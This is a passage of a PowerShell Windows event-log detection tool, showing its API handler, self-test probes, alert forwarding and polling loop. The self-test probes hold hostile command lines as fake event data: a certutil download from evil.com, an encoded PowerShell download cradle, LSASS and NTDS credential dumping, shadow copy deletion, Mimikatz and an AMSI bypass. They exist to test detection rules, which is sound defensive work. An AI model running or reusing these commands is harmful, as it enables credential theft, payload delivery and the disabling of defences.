        Send-Json $res (@{ ok = $true; keySet = $true } | ConvertTo-Json)
      }
      '^/api/settings/gemini-key/clear$' {
        if ($method -ne 'POST') { Send-Json $res '{"error":"Method not allowed - POST only."}' 405; return }
        if (-not (Test-SameOrigin $ctx)) { Send-Json $res '{"error":"Cross-origin request refused."}' 403; return }
        $me = Get-SessionUser $ctx
        $geminiKeyFile = if ($PSScriptRoot) { Join-Path $PSScriptRoot "sentinel-gemini.key" } else { "sentinel-gemini.key" }
        if (Test-Path $geminiKeyFile) { Remove-Item $geminiKeyFile -Force -ErrorAction SilentlyContinue }
        Write-AuthEvent $clientIp $me 'success' 'Gemini API key cleared'
        Send-Json $res (@{ ok = $true; keySet = $false } | ConvertTo-Json)
      }
      default {
        Send-Json $res '{"error":"Not found."}' 404
      }
    }
  } catch {
    try { Send-Json $res ('{"error":"' + (($_.Exception.Message) -replace '"', "'") + '"}') 500 } catch { }
  } finally {
    try { $res.OutputStream.Close() } catch { }
  }
}

# ============================================================
# SELF-TEST PROBES
# ============================================================
# One event sequence per rule family. Threshold rules carry enough events to
# actually cross their threshold, so the self-test proves real coverage rather
# than just plumbing.
function New-SelfTestProbes {
  $probes = @()
  $sprayAccounts = @('jsmith', 'agarcia', 'mchen', 'rkhan', 'ltaylor')

  foreach ($a in $sprayAccounts) {
    $probes += @{ ruleKey = 'password_spraying'; id = 4625; fields = @{ TargetUserName = $a; IpAddress = '127.0.0.99'; Status = '0xC000006A' } }
  }
  for ($i = 0; $i -lt 8; $i++) {
    $probes += @{ ruleKey = 'brute_force_single_account'; id = 4625; fields = @{ TargetUserName = 'svc-backup'; IpAddress = '127.0.0.101'; Status = '0xC000006A' } }
  }
  foreach ($a in $sprayAccounts) {
    $probes += @{ ruleKey = 'kerberos_preauth_spraying'; id = 4771; fields = @{ TargetUserName = $a; IpAddress = '127.0.0.99'; Status = '0x18' } }
  }
  for ($i = 0; $i -lt 8; $i++) {
    $who = if ($i % 2) { 'jsmith' } else { 'agarcia' }
    $probes += @{ ruleKey = 'ntlm_failed_auth'; id = 4776; fields = @{ TargetUserName = $who; Workstation = 'SELFTEST-WKS'; Status = '0xC000006A' } }
  }
  foreach ($a in @('mchen', 'rkhan', 'ltaylor')) {
    $probes += @{ ruleKey = 'account_lockout_storm'; id = 4740; fields = @{ TargetUserName = $a; SubjectUserName = 'SELFTEST-DC$' } }
  }

  $probes += @{ ruleKey = 'privilege_escalation'; id = 4728; fields = @{ MemberName = 'svc-helpdesk'; TargetUserName = 'Domain Admins'; SubjectUserName = 'administrator' } }
  $probes += @{ ruleKey = 'account_created'; id = 4720; fields = @{ TargetUserName = 'svc-update'; SubjectUserName = 'administrator' } }
  $probes += @{ ruleKey = 'account_control_changed'; id = 4738; fields = @{ TargetUserName = 'jsmith'; SubjectUserName = 'administrator'; OldUacValue = '0x200'; NewUacValue = '0x400200' } }
  $probes += @{ ruleKey = 'account_enabled_disabled'; id = 4722; fields = @{ TargetUserName = 'ltaylor'; SubjectUserName = 'administrator' } }
  $probes += @{ ruleKey = 'password_reset_by_admin'; id = 4724; fields = @{ TargetUserName = 'agarcia'; SubjectUserName = 'administrator' } }
  $probes += @{ ruleKey = 'group_membership_removed'; id = 4729; fields = @{ MemberName = 'svc-helpdesk'; TargetUserName = 'Domain Admins'; SubjectUserName = 'administrator' } }
  $probes += @{ ruleKey = 'account_deleted'; id = 4726; fields = @{ TargetUserName = 'svc-temp'; SubjectUserName = 'administrator' } }

  $probes += @{ ruleKey = 'kerberoasting'; id = 4769; fields = @{ TargetUserName = 'jsmith'; ServiceName = 'MSSQLSvc/selftest'; TicketEncryptionType = '0x17' } }
  for ($i = 0; $i -lt 3; $i++) {
    $probes += @{ ruleKey = 'asrep_roasting'; id = 4768; fields = @{ TargetUserName = 'svc-legacy'; PreAuthType = '0' } }
  }
  $probes += @{ ruleKey = 'dcsync_replication'; id = 4662; fields = @{ SubjectUserName = 'svc-repl'; ObjectType = '{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}'; ObjectName = 'DC=selftest,DC=local' } }
  for ($i = 0; $i -lt 25; $i++) {
    $probes += @{ ruleKey = 'ldap_recon'; id = 4662; fields = @{ SubjectUserName = 'recon-svc'; ObjectType = 'Group'; ObjectName = "CN=EnumTarget$i,CN=Users,DC=selftest,DC=local" } }
  }

  $probes += @{ ruleKey = 'suspicious_remote_logon'; id = 4624; fields = @{ TargetUserName = 'administrator'; IpAddress = '127.0.0.99'; LogonType = '10' } }
  $probes += @{ ruleKey = 'explicit_credential_logon'; id = 4648; fields = @{ SubjectUserName = 'jsmith'; TargetUserName = 'administrator'; TargetServerName = 'SELFTEST-DC'; ProcessName = 'C:\Windows\System32\runas.exe' } }
  $probes += @{ ruleKey = 'service_abuse'; id = 7045; fields = @{ ServiceName = 'SentinelSelfTest'; ImagePath = 'C:\Users\Public\selftest.exe -enc AA==' } }

  $probes += @{ ruleKey = 'scheduled_task_created'; id = 4698; fields = @{ TaskName = '\SentinelSelfTest'; SubjectUserName = 'administrator'; TaskContent = '<Command>powershell.exe -nop -w hidden -enc SQBFAFgA</Command>' } }
  $probes += @{ ruleKey = 'registry_persistence'; id = 4657; fields = @{ SubjectUserName = 'jsmith'; ObjectName = '\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SentinelSelfTest'; ObjectValueName = 'Updater' } }

  $probes += @{ ruleKey = 'log_tampering'; id = 1102; fields = @{ SubjectUserName = 'administrator' } }
  $probes += @{ ruleKey = 'audit_policy_changed'; id = 4719; fields = @{ SubjectUserName = 'administrator'; SubcategoryId = 'Logon' } }
  $probes += @{ ruleKey = 'eventlog_service_stopped'; id = 1100; fields = @{ Param1 = 'EventLog' } }
  $probes += @{ ruleKey = 'defender_disabled'; id = 5001; fields = @{ ProductName = 'Windows Defender' } }
  $probes += @{ ruleKey = 'dsrm_password_set'; id = 4794; fields = @{ TargetUserName = 'Administrator'; SubjectUserName = 'jsmith'; TargetUserSid = 'S-1-5-21-1234567890-1234567890-1234567890-500' } }
  $probes += @{ ruleKey = 'pass_the_hash_logon'; id = 4624; fields = @{ TargetUserName = 'administrator'; IpAddress = '10.0.0.5'; LogonType = '9'; AuthenticationPackageName = 'NTLM'; KeyLength = '0' } }

  $probes += @{ ruleKey = 'firewall_rule_modified'; id = 4946; fields = @{ SubjectUserName = 'administrator'; RuleName = 'Allow RDP inbound' } }
  $probes += @{ ruleKey = 'firewall_disabled'; id = 4950; fields = @{ SubjectUserName = 'administrator'; ProfileChanged = 'Domain'; SettingType = 'EnableFirewall'; SettingValue = 'No' } }
  $probes += @{ ruleKey = 'anonymous_smb_session'; id = 4624; fields = @{ TargetUserName = 'ANONYMOUS LOGON'; TargetUserSid = 'S-1-5-7'; LogonType = '3'; IpAddress = '127.0.0.99' } }
  $probes += @{ ruleKey = 'system_time_changed'; id = 4616; fields = @{ SubjectUserName = 'administrator'; NewTime = '2026-01-01T00:00:00.000Z' } }
  $probes += @{ ruleKey = 'special_privileges_assigned'; id = 4672; fields = @{ SubjectUserName = 'administrator'; PrivilegeList = 'SeSecurityPrivilege SeShutdownPrivilege SeChangeNotifyPrivilege' } }
  $probes += @{ ruleKey = 'gpo_or_admin_object_modified'; id = 5136; fields = @{ SubjectUserName = 'administrator'; ObjectClass = 'groupPolicyContainer'; ObjectName = 'CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=selftest,DC=local'; AttributeLDAPDisplayName = 'displayName'; AttributeValue = 'Modified GPO' } }
  $probes += @{ ruleKey = 'gpo_or_admin_object_modified'; id = 5136; fields = @{ SubjectUserName = 'administrator'; ObjectClass = 'domainDNS'; ObjectName = 'CN=Domain Controllers,DC=selftest,DC=local'; AttributeLDAPDisplayName = 'gPLink'; AttributeValue = '[LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=selftest,DC=local]' } }
  $probes += @{ ruleKey = 'gpo_or_admin_object_modified'; id = 5136; fields = @{ SubjectUserName = 'administrator'; ObjectClass = 'container'; ObjectName = 'CN=AdminSDHolder,CN=System,DC=selftest,DC=local'; AttributeLDAPDisplayName = 'nTSecurityDescriptor'; AttributeValue = 'O:DAG:DAD:...' } }
  $probes += @{ ruleKey = 'gpo_or_admin_object_modified'; id = 5136; fields = @{ SubjectUserName = 'administrator'; ObjectClass = 'user'; ObjectName = 'CN=svc-target,CN=Users,DC=selftest,DC=local'; AttributeLDAPDisplayName = 'sIDHistory'; AttributeValue = 'S-1-5-21-1234567890-1234567890-1234567890-500' } }
  $probes += @{ ruleKey = 'computer_account_abuse'; id = 4741; fields = @{ TargetUserName = 'WKS101$'; SubjectUserName = 'jsmith'; Properties = '' } }
  $probes += @{ ruleKey = 'computer_account_abuse'; id = 4742; fields = @{ TargetUserName = 'SVR01$'; SubjectUserName = 'administrator'; Properties = 'msDS-AllowedToActOnBehalfOfOtherIdentity=<BinaryData>' } }
  $probes += @{ ruleKey = 'suspicious_process_creation'; id = 4688; fields = @{ SubjectUserName = 'jsmith'; NewProcessName = 'C:\\Windows\\System32\\ntdsutil.exe'; CommandLine = 'ntdsutil "ac i ntds" "ifm" "create full c:\\temp" quit quit'; ParentProcessName = 'C:\\Windows\\System32\\cmd.exe'; ProcessId = '1234'; ParentProcessId = '5678' } }
  $probes += @{ ruleKey = 'suspicious_process_creation'; id = 4688; fields = @{ SubjectUserName = 'jsmith'; NewProcessName = 'C:\\Windows\\System32\\vssadmin.exe'; CommandLine = 'vssadmin delete shadows /for=C: /oldest'; ParentProcessName = 'C:\\Windows\\System32\\cmd.exe'; ProcessId = '1235'; ParentProcessId = '5678' } }
  $probes += @{ ruleKey = 'suspicious_process_creation'; id = 4688; fields = @{ SubjectUserName = 'jsmith'; NewProcessName = 'C:\\Windows\\System32\\reg.exe'; CommandLine = 'reg save HKLM\\SYSTEM C:\\temp\\SYSTEM.hiv'; ParentProcessName = 'C:\\Windows\\System32\\cmd.exe'; ProcessId = '1236'; ParentProcessId = '5678' } }
  $probes += @{ ruleKey = 'suspicious_process_creation'; id = 4688; fields = @{ SubjectUserName = 'jsmith'; NewProcessName = 'C:\\Windows\\System32\\rundll32.exe'; CommandLine = 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 1234 C:\\temp\\lsass.dmp full'; ParentProcessName = 'C:\\Windows\\System32\\cmd.exe'; ProcessId = '1237'; ParentProcessId = '5678' } }
  $probes += @{ ruleKey = 'suspicious_process_creation'; id = 4688; fields = @{ SubjectUserName = 'jsmith'; NewProcessName = 'C:\\Windows\\System32\\certutil.exe'; CommandLine = 'certutil -urlcache -f http://evil.com/payload.exe C:\\temp\\payload.exe'; ParentProcessName = 'C:\\Windows\\System32\\cmd.exe'; ProcessId = '1238'; ParentProcessId = '5678' } }
  $probes += @{ ruleKey = 'suspicious_process_creation'; id = 4688; fields = @{ SubjectUserName = 'jsmith'; NewProcessName = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'; CommandLine = 'powershell -enc SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAnACkA'; ParentProcessName = 'C:\\Windows\\System32\\cmd.exe'; ProcessId = '1239'; ParentProcessId = '5678' } }
  $probes += @{ ruleKey = 'powershell_scriptblock'; id = 4104; fields = @{ User = 'jsmith'; Message = 'Invoke-Mimikatz -DumpCreds'; ProcessId = '1240'; Computer = 'SELFTEST-DC'; ContextInfo = 'Module=Microsoft.PowerShell.Core,User=jsmith' } }
  $probes += @{ ruleKey = 'powershell_scriptblock'; id = 4104; fields = @{ User = 'jsmith'; Message = '[Convert]::FromBase64String("...") | IEX'; ProcessId = '1241'; Computer = 'SELFTEST-DC'; ContextInfo = 'Module=Microsoft.PowerShell.Core,User=jsmith' } }
  $probes += @{ ruleKey = 'powershell_scriptblock'; id = 4104; fields = @{ User = 'jsmith'; Message = 'amsiutils: [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)'; ProcessId = '1242'; Computer = 'SELFTEST-DC'; ContextInfo = 'Module=Microsoft.PowerShell.Core,User=jsmith' } }

  return $probes
}

# Builds a Get-WinEvent-shaped shim from a probe, so probes run through the
# same Get-NormalizedEvent + Evaluate-Event path real events take.
function New-EventShim($p) {
  # Escape every probe key and value: the TaskContent probe carries raw XML, and
  # interpolating it straight into the shim document (as before) meant one
  # unescaped '<' or '&' made the shim unparseable and killed the whole run.
  $fieldsXml = ($p.fields.GetEnumerator() | ForEach-Object {
      "<Data Name='" + [System.Security.SecurityElement]::Escape("$($_.Key)") + "'>" + [System.Security.SecurityElement]::Escape("$($_.Value)") + "</Data>"
    }) -join ''
  $ts = (Get-Date).ToUniversalTime().ToString("o")
  $xmlString = "<Event><System><EventID>$($p.id)</EventID><TimeCreated SystemTime='$ts'/><Computer>SENTINEL-SELFTEST</Computer></System><EventData>$fieldsXml</EventData></Event>"
  $shimXml = [xml]$xmlString
  $shim = New-Object PSObject
  $shim | Add-Member -MemberType NoteProperty -Name Id -Value $p.id -Force
  $shim | Add-Member -MemberType NoteProperty -Name Machine -Value 'SENTINEL-SELFTEST' -Force
  $shim | Add-Member -MemberType ScriptProperty -Name XmlObj -Value ({ return $shimXml }.GetNewClosure()) -Force
  $shim | Add-Member -MemberType ScriptMethod -Name ToXml -Value { return $this.XmlObj.OuterXml } -Force
  return $shim
}

# ============================================================
# OPTIONAL WEB FORWARDING
# ============================================================
# Sends the FULL normalised event (not just the event ID) so the platform's
# own rule engine can match it - its rules read sourceIp, targetGroup,
# encryptionType, logonType, serviceBinaryPath and friends, so forwarding only
# an event ID meant no server-side rule could ever fire.
$Script:Forwarded = 0
function Forward-ToWeb($alert) {
  if (-not $ForwardUrl -or -not $ForwardKey) { return }
  if (-not $alert.Fields) { return }   # restored from history CSV: payload is gone
  try {
    $body = @{}
    foreach ($k in $alert.Fields.Keys) { $body["$k"] = "$($alert.Fields[$k])" }
    $body['eventId'] = "$($alert.EventId)"
    $body['source'] = 'sentinel'
    # Send the FINISHED ALERT, not just the raw event. The platform only ever
    # saw the single event that crossed Sentinel's threshold, so its own
    # spray / brute-force thresholds (which need a run of events) were never
    # met and nothing appeared there. These fields let the platform ingest the
    # alert directly instead of re-deriving it - platforms that ignore unknown
    # keys are unaffected.
    $body['isAlert']     = 'true'
    $body['ruleKey']     = "$($alert.RuleKey)"
    $body['severity']    = "$($alert.Severity)"
    $body['title']       = "$($alert.Title)"
    $body['description'] = "$($alert.Description)"
    $body['mitre']       = "$($alert.Mitre)"
    $body['alertedAt']   = "$($alert.Time)"
    $json = $body | ConvertTo-Json -Depth 3
    # -TimeoutSec matters: this loop is SINGLE-THREADED, so one slow platform
    # call used to freeze both the polling and the dashboard with no timeout.
    Invoke-RestMethod -Uri $ForwardUrl -Method Post -Body $json -ContentType "application/json" `
      -Headers @{ "X-Alpha-Collector-Key" = $ForwardKey } -TimeoutSec 8 -ErrorAction Stop | Out-Null
    $Script:Forwarded++
  } catch {
    # no longer silent: a forwarding failure is counted and reported on
    # /api/health so it stops looking like "no alerts are happening"
    $Script:ForwardFailures++
    if ($Script:ForwardFailures -le 3 -or ($Script:ForwardFailures % 25) -eq 0) {
      Write-Host "  [forward] failed ($($Script:ForwardFailures) total): $_" -ForegroundColor DarkYellow
    }
  }
}

# ============================================================
# EVENT-LOG POLLING LOOP
# ============================================================
# Grouped by the channel each event is actually written to: 7045 (service
# installed) lives in the System log, Defender's 5001/5010/5012 live in the
# Defender Operational channel, and 1100 ("event logging service has shut down")
# is written to the SECURITY log - polling System for it, as this script used
# to, meant that rule could never fire.
$LogSources = @(
  @{ Log = 'Security'; Ids = @(
      4624, 4625, 4648, 4657, 4662, 4672, 4688, 4697, 4698, 4719, 4720, 4722, 4724,
      4725, 4726, 4728, 4729, 4732, 4733, 4738, 4740, 4741, 4742, 4756, 4768,
      4769, 4771, 4776, 4794, 4946, 4947, 4948, 4949, 4950, 5136, 5141, 1100, 1102, 4616
    )
  }
  @{ Log = 'System'; Ids = @(7045) }
  @{ Log = 'Microsoft-Windows-Windows Defender/Operational'; Ids = @(5001, 5010, 5012) }
  @{ Log = 'Microsoft-Windows-PowerShell/Operational'; Ids = @(4104) }
)
$MonitoredEventIdCount = (@($LogSources | ForEach-Object { $_.Ids }) | Select-Object -Unique).Count

# (the poll watermark lives in the STATE block at the top, and is restored from
#  $StateFile by Restore-State so a restart neither re-alerts nor skips the gap)

# ---- channel watermarks ---------------------------------------------------
function Get-ChannelMark($channel) {
  if ($Script:ChannelMarks.ContainsKey($channel) -and $Script:ChannelMarks[$channel]) {
    return $Script:ChannelMarks[$channel]
  }
  return $Script:LastCheck
}

function Set-ChannelMark($channel, $when) {
  $Script:ChannelMarks[$channel] = $when
  if ($Script:ChannelMarks.Count -gt 0) {
    $Script:LastCheck = ($Script:ChannelMarks.Values | Sort-Object)[0]   # oldest
  }
}

# Poll lag: how far behind the newest events the OLDEST channel is. This is the
# number that says "the tool is not keeping up", so it is surfaced in
# /api/health and as a dashboard pill.
function Get-PollLagSeconds {
  if ($Script:ChannelMarks.Count -eq 0) { return 0 }
  $oldest = ($Script:ChannelMarks.Values | Sort-Object)[0]
  return [int][Math]::Round(((Get-Date) - $oldest).TotalSeconds)
}

# ---- what "catching up" actually means -------------------------------------
# An IDLE system carries lag by design. It polls every -PollSeconds, and the
# watermark is deliberately backdated 5s for overlap, so the lag cycles between
# roughly 5s and one poll interval + 5s while nothing is wrong. The old
# "lag > 2 seconds" test therefore called a perfectly healthy idle monitor
# "catching up" for its whole life. A real backlog is either:
#   * a poll that had to defer events, or
#   * lag past two whole poll intervals plus the overlap margin.
# dashboard.js mirrors the rule (and prefers the server's verdict when present).
function Get-CatchUpState([int]$LagSeconds) {
  $threshold = ($PollSeconds * 2) + 5
  $capped = [bool]$Script:LastPollCapped
  return [PSCustomObject]@{
    catchingUp = ($capped -or ($LagSeconds -gt $threshold))
    capped     = $capped
    threshold  = $threshold
  }
}

# 200 ms catch-up instead of a whole -PollSeconds when a poll had to defer
# events: at the 500-event cap a full interval is only ~33 events/second, so the
# backlog would never drain on a busy DC.
function Get-NextPollDelaySeconds($capped) {
  if ($capped) { return ([double]$CatchUpMilliseconds / 1000.0) }
  return ([double]$PollSeconds)
}

# The seen-record ring keeps a re-queried event (the watermark boundary event
# comes back, and a deferred poll re-reads its window) from being evaluated
# twice.
function Prune-SeenRecords {
  if ($Script:SeenRecords.Count -lt 5000) { return }
  $cut = (Get-Date).AddMinutes(-15)
  foreach ($k in @($Script:SeenRecords.Keys)) {
    if ($Script:SeenRecords[$k] -lt $cut) { $Script:SeenRecords.Remove($k) }
  }
}

# ---- XPath pre-filter for the noisiest event IDs --------------------------
# Three IDs are the bulk of a busy DC's volume and nearly all of it is
# uninteresting: 4624 (every logon and every service start), 4769 (every ticket)
# and 4776 (every NTLM validation). Filtering them inside the query means that
# XML is never parsed in PowerShell at all. Every in-engine check stays exactly
# as it is - this only narrows what reaches the engine.
#
# The fragments below must be a SUPERSET of what the engine cares about: the
# engine additionally treats 4776 Status "0" and "0x00000000" as success, and
# 4769 "23" as RC4, and those extra events simply pass the filter and are then
# rejected by the engine. The filter must never drop an event the engine would
# have alerted on.
$NoisyIdFilters = @{
  '4624' = "Data[@Name='LogonType']='3' or Data[@Name='LogonType']='10'"
  '4769' = "Data[@Name='TicketEncryptionType']='0x17' or Data[@Name='TicketEncryptionType']='23'"
  '4776' = "not(Data[@Name='Status']='0x0')"
}

# The event-ID / event-data half of the query, as one disjunction. Kept separate
# from the time predicate so it can be tested on its own (see the note below).
function Get-ChannelIdDisjuncts($ids) {
  $disjuncts = @()
  foreach ($id in @($ids)) {
    $key = "$id"
    if ($NoisyIdFilters.ContainsKey($key)) {
      $disjuncts += ("(System[EventID=" + $id + "] and EventData[" + $NoisyIdFilters[$key] + "])")
    } else {
      $disjuncts += ("System[EventID=" + $id + "]")
    }
  }
  return ("(" + ($disjuncts -join " or ") + ")")
}

# The window start, formatted the way Windows itself formats it for a
# -FilterHashtable StartTime (PowerShell's GetEventCommand builds
# "s" + ".fff" + "Z"). The event log compares SystemTime in that form.
function Format-EventLogTime([datetime]$When) {
  $u = $When.ToUniversalTime()
  $inv = [System.Globalization.CultureInfo]::InvariantCulture
  return ($u.ToString("s", $inv) + "." + $u.Millisecond.ToString("d3", $inv) + "Z")
}

# NOTE on the time predicate: '@SystemTime>=' is a STRING RANGE comparison
# inside the event log's own query engine - that is the form PowerShell itself
# generates, so it is what the provider expects. A plain XPath 1.0 engine (e.g.
# XmlDocument.SelectNodes, which the test harness uses) would coerce both sides
# to numbers for a relational operator and get NaN, so the test suite validates
# the ID/data disjunction against a real XML document and checks the shape of the
# time predicate separately.
function Get-ChannelFilterXPath($ids, $since) {
  $sinceUtc = Format-EventLogTime ([datetime]$since)
  return ("*[System[TimeCreated[@SystemTime>='" + $sinceUtc + "']] and " + (Get-ChannelIdDisjuncts $ids) + "]")
}

# The XPath above is a plain XPath expression ('>' and all), which is what a
# test harness or a direct SelectNodes() call needs. It only has to be escaped
# when it is embedded in the QueryList DOCUMENT below - if the '>' were escaped
# in the expression itself, the XPath engine would choke on "&gt;=".
function Get-ChannelFilterXml($channel, $ids, $since) {
  $xpath = Get-ChannelFilterXPath $ids $since
  $escaped = $xpath.Replace('>', '&gt;')
  return ('<QueryList><Query Id="0" Path="' + $channel + '"><Select Path="' + $channel + '">' + $escaped + '</Select></Query></QueryList>')
}

# Query one channel. Returns @{ Events; UsedXPath }. THROWS on failure - the
# caller leaves the watermark untouched so those events are retried, rather than
# the old behaviour of swallowing the error with -ErrorAction SilentlyContinue
# and advancing the watermark past events that were never read.
#
# If the provider rejects the XPath (it can, on a differently-patched DC) the
# channel falls back to the plain Id filter and remembers, so the failing query
# is not paid for on every poll.
# Classify a Get-WinEvent failure by its FullyQualifiedErrorId - NEVER by the
# message text, which is localised. Seen on the real Server 2012 R2 lab box:
#   NoMatchingEventsFound*  nothing matched the filter: an IDLE channel, which
#                           is the normal state of a quiet network, not an error
#   NoMatchingLogsFound*    the channel does not exist on this OS (Defender's
#                           Operational log is absent on Server 2012 R2)
function Get-WinEventErrorKind($err) {
  $id = ""
  if ($err -and $err.FullyQualifiedErrorId) { $id = "$($err.FullyQualifiedErrorId)" }
  if ($id -like 'NoMatchingEventsFound*') { return 'no-events' }
  if ($id -like 'NoMatchingLogsFound*') { return 'no-log' }
  return 'real'
}

function Get-ChannelEvents($channel, $ids, $since, $cap = 0) {
  # Read OLDEST-first and only one page (cap + 1) per poll, so a poll reads what
  # it is going to process instead of materialising a whole backlog every time.
  # The +1 is how a full page is recognised: cap+1 results means there is more.
  $max = 0
  if ($cap -gt 0) { $max = $cap + 1 }
  if (-not $Script:XPathFallback[$channel]) {
    try {
      $filterXml = Get-ChannelFilterXml $channel $ids $since
      if ($max -gt 0) {
        $events = @(Get-WinEvent -FilterXml $filterXml -Oldest -MaxEvents $max -ErrorAction Stop)
      } else {
        $events = @(Get-WinEvent -FilterXml $filterXml -ErrorAction Stop)
      }
      return @{ Events = $events; UsedXPath = $true }
    } catch {
      $kind = Get-WinEventErrorKind $_
      if ($kind -eq 'no-events') {
        # a channel with no matching events is IDLE, not broken: Get-WinEvent
        # throws for it, but treating that as an error flipped XPathFallback on
        # every idle poll and drove the health pill red on a healthy box
        return @{ Events = @(); UsedXPath = $true; Idle = $true }
      }
      if ($kind -eq 'no-log') {
        # the channel itself does not exist on this OS - hand the decision to
        # the poll loop, which marks it unavailable exactly once
        return @{ Events = @(); UsedXPath = $true; NoLog = $true }
      }
      $Script:XPathFallback[$channel] = $true
      $Script:ChannelLastError[$channel] = "XPath pre-filter rejected: $($_.Exception.Message)"
      Write-Host ("  [poll] " + $channel + ": XPath pre-filter not accepted - using the plain Id filter from now on.") -ForegroundColor DarkYellow
    }
  }
  try {
    if ($max -gt 0) {
      $events = @(Get-WinEvent -FilterHashtable @{ LogName = $channel; Id = $ids; StartTime = $since } -Oldest -MaxEvents $max -ErrorAction Stop)
    } else {
      $events = @(Get-WinEvent -FilterHashtable @{ LogName = $channel; Id = $ids; StartTime = $since } -ErrorAction Stop)
    }
    return @{ Events = $events; UsedXPath = $false }
  } catch {
    $kind = Get-WinEventErrorKind $_
    if ($kind -eq 'no-events') { return @{ Events = @(); UsedXPath = $false; Idle = $true } }
    if ($kind -eq 'no-log') { return @{ Events = @(); UsedXPath = $false; NoLog = $true } }
    throw
  }
}

# Process one channel's batch: oldest-first, capped, with a try/catch PER EVENT.
# One malformed event used to abort the rest of the batch while the watermark
# still advanced, which lost those events permanently. Now the bad event is
# counted and skipped and the batch continues.
function Invoke-ChannelBatch($channel, $events, $cap) {
  $batch = @($events) | Sort-Object TimeCreated
  $capped = $false
  $deferred = 0
  if ($cap -gt 0 -and $batch.Count -gt $cap) {
    $deferred = $batch.Count - $cap
    $batch = @($batch | Select-Object -First $cap)
    $capped = $true
  }

  $evaluated = 0
  $alerts = 0
  $errors = 0
  foreach ($e in $batch) {
    $recId = [int64]0
    try { $recId = [int64]$e.RecordId } catch { $recId = 0 }
    if ($recId -gt 0) {
      # EventRecordID is unique PER LOG CHANNEL, not globally: the Security and
      # System logs (and the Defender channel) each keep their own counter, so the
      # same numeric id in two channels is two different events. Keying by the
      # bare id dropped the second one - a real missed-detection bug across
      # channels. Include the channel in the key.
      $seenKey = "$channel|$recId"
      if ($Script:SeenRecords.ContainsKey($seenKey)) { continue }
      # marked seen BEFORE evaluation: a poison event must not be retried forever
      $Script:SeenRecords[$seenKey] = Get-Date
    }
    $evaluated++
    $alert = $null
    $Script:LastMatchedRule = $null
    try {
      $alert = Evaluate-Event $e
    } catch {
      $errors++
      $Script:EvalErrors++
      $Script:LastEvalError = "event $($e.Id) record $recId : $($_.Exception.Message)"
      continue
    }
    # ---- observability: the event is recorded whether or not it alerted, and
    # ---- LastMatchedRule is set by the rule path, so a dedupe-suppressed hit
    # ---- still reports which rule it fired
    Add-ObservedEvent $channel $Script:LastNormFields $Script:LastMatchedRule $Script:LastEventTime
    if ($alert) {
      $Script:Alerts.Add($alert)
      $Script:ProcessedCount++
      $alerts++
      Add-ObservedAlert $alert
      Forward-ToWeb $alert
    }
  }

  $lastTime = $null
  if ($batch.Count -gt 0) {
    $last = $batch | Select-Object -Last 1
    if ($last -and $last.TimeCreated) { $lastTime = $last.TimeCreated }
  }
  Prune-SeenRecords
  return [PSCustomObject]@{
    Evaluated = $evaluated
    Alerts    = $alerts
    Errors    = $errors
    Capped    = $capped
    Deferred  = $deferred
    LastTime  = $lastTime
  }
}

function Invoke-PollOnce {
  $anyError = $false
  $newAlerts = 0
  $evaluatedTotal = 0
  $anyCapped = $false
  # Read the instant the poll began: a channel that completes moves its
  # watermark here, so nothing written while the poll was running is skipped.
  $pollStart = Get-Date

  foreach ($source in $LogSources) {
    $channel = $source.Log
    if ($Script:ChannelUnavailable.ContainsKey($channel)) { continue }   # marked once, skipped after
    $since = Get-ChannelMark $channel
    try {
      $query = Get-ChannelEvents $channel $source.Ids $since $MaxEventsPerPoll
      if ($query.NoLog) {
        # this OS has no such log: say so ONCE, then skip the channel on every
        # later poll - it must not count as lag, as an error, or in health
        $Script:ChannelUnavailable[$channel] = $true
        $Script:ChannelMarks.Remove($channel)   # a stale mark would poison the lag
        Write-Host ("  [poll] " + $channel + ": log not present on this OS - skipped") -ForegroundColor Yellow
        $Script:ChannelLastError[$channel] = ''
        continue
      }
      $batch = Invoke-ChannelBatch $channel $query.Events $MaxEventsPerPoll

      # The query AND the processing both completed, so the mark may move.
      if ($batch.Capped -and $batch.LastTime) {
        $mark = $batch.LastTime
        if ($mark -lt $since) { $mark = $since }
        $anyCapped = $true
      } else {
        # Backdate by 5s. An event can be written after the query took its
        # snapshot but before $pollStart was taken, and would then sit outside
        # every window. The seen-record ring drops what the overlap re-reads, so
        # the overlap costs nothing but closes that hole.
        $mark = $pollStart.AddSeconds(-5)
      }
      Set-ChannelMark $channel $mark
      $Script:ChannelLastSuccess[$channel] = $pollStart
      $Script:ChannelLastError[$channel] = ''
      $newAlerts += $batch.Alerts
      $evaluatedTotal += $batch.Evaluated

      if ($batch.Capped) {
        Write-Host ("  [poll] " + $channel + ": page limit reached (" + $MaxEventsPerPoll + " events) with more waiting - catching up.") -ForegroundColor DarkYellow
      }
      if ($batch.Errors -gt 0) {
        Write-Host ("  [poll] " + $channel + ": " + $batch.Errors + " event(s) failed to evaluate and were skipped (see /api/health evalErrors).") -ForegroundColor DarkYellow
      }
    } catch {
      # Query failed: leave the watermark where it is so these events are read
      # again next poll instead of being skipped.
      $Script:PollErrors++
      $Script:LastPollError = "$channel : $($_.Exception.Message)"
      $Script:ChannelLastError[$channel] = "$($_.Exception.Message)"
      Write-Host "  [poll] $channel error (watermark left unchanged): $_" -ForegroundColor Red
      $anyError = $true
    }
  }

  # Remembered for /api/status: a capped poll IS "catching up", regardless of lag.
  $Script:LastPollCapped = $anyCapped
  $Script:LagSeconds = Get-PollLagSeconds
  if ($Script:LagSeconds -gt 120) {
    if (-not $Script:LagWarned) {
      Write-Host ("  [poll] WARNING: " + $Script:LagSeconds + "s behind on the newest events - the backlog is not draining.") -ForegroundColor Red
      $Script:LagWarned = $true
    }
  } else {
    $Script:LagWarned = $false
  }

  if ($newAlerts -gt 0) {
    $Script:AlertsDirty = $true
    Save-History
  }
  Save-State
  return [PSCustomObject]@{
